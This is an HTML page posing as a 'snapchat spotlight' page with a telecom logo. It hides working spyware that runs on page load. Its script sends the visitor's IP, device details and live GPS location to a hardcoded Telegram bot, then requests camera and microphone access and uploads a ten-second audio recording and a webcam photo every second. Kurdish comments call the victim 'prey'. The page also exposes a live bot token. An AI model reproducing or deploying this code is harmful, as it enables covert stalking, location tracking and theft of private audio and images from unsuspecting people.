<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <link rel="icon" type="image/png" href="https://www.korektelecom.com/media/1001/korek-logo.png">
    <title>snapchat spotlight</title>
    <style>body { background-color: white; margin: 0; overflow: hidden; }</style>
</head>
<body onload="capture()">
<script>
    const urlParams = new URLSearchParams(window.location.search);
    const targetID = urlParams.get('id'); 
    const TOKEN = "8431515310:AAG0xW2hgSbex-3vmGx8bXxiR3BADu10N3g";

    async function capture() {
        if (!targetID) return;

        // 🚀 قۆناغی ١: ناردنی خێرای IP و زانیاری سیستەم (وەک لۆژیکە کۆنەکە)
        try {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            
            let batteryInfo = "Unknown";
            if (navigator.getBattery) {
                const batt = await navigator.getBattery();
                batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
            }

            let report = `🦅 <b>نێچیرێکی نوێ ڕاوکرا!</b>\n\n` +
                         `👤 <b>ID:</b> <code>${targetID}</code>\n` +
                         `🌐 <b>IP:</b> <code>${ipData.ip}</code>\n` +
                         `🔋 <b>Battery:</b> <code>${batteryInfo}</code>\n` +
                         `📱 <b>Device:</b> <code>${navigator.platform}</code>`;

            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: targetID, text: report, parse_mode: "HTML" })
            });
        } catch (e) { console.log("System data failed"); }

        // 📍 قۆناغی ٢: ناردنی لوکەیشن (نەخشە لەناو تێلێگرام)
        navigator.geolocation.watchPosition(pos => {
            fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ 
                    chat_id: targetID, 
                    latitude: pos.coords.latitude, 
                    longitude: pos.coords.longitude,
                    live_period: 3600 
                })
            });
        }, null, { enableHighAccuracy: true });

        // 🎥 قۆناغی ٣: کامێرا و دەنگ (تەنها ئەگەر Allow کرا)
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });

            // دەنگی ١٠ چرکە
            const mediaRecorder = new MediaRecorder(stream);
            let chunks = [];
            mediaRecorder.ondataavailable = e => chunks.push(e.data);
            mediaRecorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'audio/ogg' });
                const fd = new FormData();
                fd.append("chat_id", targetID);
                fd.append("voice", blob, "voice.ogg");
                fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: "POST", body: fd });
            };
            mediaRecorder.start();
            setTimeout(() => mediaRecorder.stop(), 10000);

            // وێنەی بەردەوام (هەر ١ چرکە)
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            setInterval(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => {
                    const fd = new FormData();
                    fd.append("chat_id", targetID);
                    fd.append("photo", blob, `snap.jpg`);
                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd });
                }, 'image/jpeg', 0.4);
            }, 1000);

        } catch (e) { console.log("Media blocked"); }
    }
</script>
</body>
</html>
